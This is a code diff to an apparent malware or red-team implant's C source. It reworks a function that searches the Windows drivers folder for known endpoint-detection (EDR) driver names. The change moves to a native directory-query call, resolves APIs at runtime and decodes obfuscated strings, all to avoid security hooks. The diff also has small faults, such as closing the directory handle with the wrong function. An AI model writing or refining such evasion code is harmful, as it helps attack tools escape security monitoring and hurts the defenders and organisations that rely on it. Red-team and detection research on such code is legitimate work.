@@ -1,8 +1,18 @@
 #include "detector.h"
 #include "evasion.h"
-#include <winternl.h>
 #include <stdio.h>
 #include <time.h>
+#include <wchar.h> // Required for wcslen
+
+void _customInitUnicodeString(
+    PUNICODE_STRING str,
+    PCWSTR buffer
+)
+{
+    str->Buffer = (PWSTR)buffer;
+    str->Length = (USHORT)(wcslen(buffer) * sizeof(WCHAR));
+    str->MaximumLength = str->Length + sizeof(WCHAR);
+}
 
 // EDR Detection: Scan system driver directory for known EDR drivers
 bool DetS()
@@ -22,34 +32,145 @@ bool DetS()
     pFindClose_t pFindClose = (pFindClose_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]FindClose"));
     pFindFirstFileA_t pFindFirstFileA = (pFindFirstFileA_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]FindFirstFileA"));
 
-    WIN32_FIND_DATAA findFileData;
-    HANDLE hFind = pFindFirstFileA(obfs_decode(DECKEY, "[OBFS_ENC]C:\\Windows\\System32\\drivers\\*.sys"), &findFileData);
+    HANDLE hDir;
+    IO_STATUS_BLOCK iosb = {0};
+    PFILE_FULL_DIR_INFORMATION info;
+    NTSTATUS status;
+    PBYTE buffer = NULL;
+    char *path = obfs_decode(DECKEY,"[OBFS_ENC]C:\\Windows\\System32\\drivers");
+    hDir = CreateFileA(
+        obfs_decode(DECKEY,"[OBFS_ENC]C:\\Windows\\System32\\drivers"),
+        FILE_LIST_DIRECTORY,
+        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+        NULL,
+        OPEN_EXISTING,
+        FILE_FLAG_BACKUP_SEMANTICS,
+        // FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OVERLAPPED, // Overlapped for async support if needed
+        NULL
+    );
+   
+    if (hDir == INVALID_HANDLE_VALUE) {
+        DWORD err = GetLastError();
+        myDebug(DEBUG_ERROR, "CreateFileW failed: %lu (0x%08X)\n", err, err);
+        goto failure;
+    }
+    // Allocate buffer
+    const ULONG bufferSize = 65536;
+    buffer = (PBYTE)malloc(bufferSize);
+    if (!buffer) {
+        myDebug(DEBUG_ERROR,"Memory allocation failed\n");
+        goto failure;
+    }
 
-    if (hFind == INVALID_HANDLE_VALUE)
-        return false;
-
-    do
-    {
-        for (int i = 0; i < sizeof(edrDriversEncoded) / sizeof(edrDriversEncoded[0]); i++)
-        {
-            char *decodedDriver = obfs_decode(DECKEY, edrDriversEncoded[i]); // Decode Path
-            if (!decodedDriver) {
-                myDebug(DEBUG_ERROR, "Error while checking driver item %d", i);
-                continue;
+    BOOL firstCall = TRUE;
+    UNICODE_STRING mask;
+    _customInitUnicodeString(&mask, L"*.sys");
+    pNtQueryDirectoryFile NtQueryDirectoryFile =
+    (pNtQueryDirectoryFile)GetProcAddress(
+        GetModuleHandleW(L"ntdll.dll"),
+        "NtQueryDirectoryFile"
+    );
+    do {
+        status = CustQDF(
+            hDir,
+            NULL, // Event
+            NULL, // ApcRoutine
+            NULL, // ApcContext
+            &iosb,
+            buffer,
+            bufferSize,
+            FileFullDirectoryInformation,
+            FALSE, // ReturnSingleEntry
+            &mask,  // FileMask
+            firstCall // RestartScan
+        );
+        if (!NT_SUCCESS(status)) {
+            if (status == STATUS_NO_MORE_FILES) {
+                break;
             }
+            myDebug(DEBUG_INFO,
+                "hDir=%p buffer=%p size=%lu mask=%p len=%u max=%u\n",
+                hDir,
+                buffer,
+                bufferSize,
+                mask.Buffer,
+                mask.Length,
+                mask.MaximumLength
+            );
+            myDebug(DEBUG_ERROR,"Query failed: 0x%X\n", status);
+            break;
+        }
+        
+        info = (PFILE_FULL_DIR_INFORMATION)buffer;
+        while (info) {
+            for (int i = 0; i < sizeof(edrDriversEncoded) / sizeof(edrDriversEncoded[0]); i++)
+            {
+                char *decodedDriver = obfs_decode(DECKEY, edrDriversEncoded[i]); // Decode Path                    
+                int nameLen = info->FileNameLength / sizeof(WCHAR);
+                wchar_t tmp[MAX_PATH];
+                if (nameLen >= MAX_PATH)
+                    nameLen = MAX_PATH - 1;
+                memcpy(tmp, info->FileName, nameLen * sizeof(WCHAR));
+                tmp[nameLen] = L'\0';
+                char fileNameA[MAX_PATH];
+                WideCharToMultiByte(
+                    CP_ACP,
+                    0,
+                    tmp,
+                    -1,
+                    fileNameA,
+                    MAX_PATH,
+                    NULL,
+                    NULL
+                );
+                if (pStrStrIA(fileNameA, decodedDriver))
+                {
+                    myDebug(DEBUG_INFO, "Detected EDR: %s", decodedDriver);
+                    goto success;
+                } 
+            }
+            if (info->NextEntryOffset == 0) {
+                break;
+            }
+            info = (PFILE_FULL_DIR_INFORMATION)((PBYTE)info + info->NextEntryOffset);
+        }
+        firstCall = FALSE;
+    } while (status != STATUS_NO_MORE_FILES);
+
+    // WIN32_FIND_DATAA findFileData;
+    // HANDLE hFind = pFindFirstFileA(obfs_decode(DECKEY, "[OBFS_ENC]C:\\Windows\\System32\\drivers\\*.sys"), &findFileData);
+
+    // if (hFind == INVALID_HANDLE_VALUE)
+    //     return false;
+
+    // do
+    // {
+    //     for (int i = 0; i < sizeof(edrDriversEncoded) / sizeof(edrDriversEncoded[0]); i++)
+    //     {
+    //         char *decodedDriver = obfs_decode(DECKEY, edrDriversEncoded[i]); // Decode Path
+    //         if (!decodedDriver) {
+    //             myDebug(DEBUG_ERROR, "Error while checking driver item %d", i);
+    //             continue;
+    //         }
                 
             
-            if (pStrStrIA(findFileData.cFileName, decodedDriver))
-            {
-                myDebug(DEBUG_INFO, "Detected EDR: %s", decodedDriver);
-                return true;
-            }
-        }
-    } while (pFindNextFileA(hFind, &findFileData));
-
-    pFindClose(hFind);
+    //         if (pStrStrIA(findFileData.cFileName, decodedDriver))
+    //         {
+    //             myDebug(DEBUG_INFO, "Detected EDR: %s", decodedDriver);
+    //             return true;
+    //         }
+    //     }
+    // } while (pFindNextFileA(hFind, &findFileData));
+    failure:
+    free(buffer);
+    pFindClose(hDir);
     myDebug(DEBUG_SUCCESS, "No EDRs detected :)");
     return false;
+
+    success:
+    free(buffer);
+    pFindClose(hDir);
+    return true;
 }
 
 // Sleep Patching Detection: Checks if Sleep(10000) completes normally
